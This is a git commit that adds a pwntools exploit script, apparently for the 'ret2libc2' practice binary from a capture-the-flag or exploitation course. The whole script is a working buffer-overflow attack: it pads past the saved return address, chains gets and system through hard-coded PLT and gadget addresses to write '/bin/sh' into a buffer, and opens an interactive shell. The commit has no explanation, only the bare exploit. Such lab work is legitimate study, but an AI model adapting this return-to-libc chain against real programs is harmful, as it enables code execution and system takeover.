0b26a93aa911b1d2e84d5d41815a3129e204fd18
Shawn <yuanxinyi@mails.ucas.ac.cn>
2023-04-23 18:49:45 +0800

    ret2libc3 unfinished

---
+++ ret2libc2/ret2libc2.py
@@ -0,0 +1,19 @@
+#!/usr/bin/env python3
+
+from pwn import *
+
+gets_plt = 0x08048460
+sysrem_plt = 0x08048490
+pop_ebx_ret_addr = 0x0804843d
+buf2_addr = 0x0804a080
+offset = 0x6c + 4
+
+payload = flat([b'A' * offset, \
+	gets_plt, \
+	pop_ebx_ret_addr, buf2_addr, \
+	sysrem_plt, 0xdeadbeef, buf2_addr])
+
+sh = process('./ret2libc2')
+sh.sendline(payload)
+sh.sendline(b'/bin/sh')
+sh.interactive()
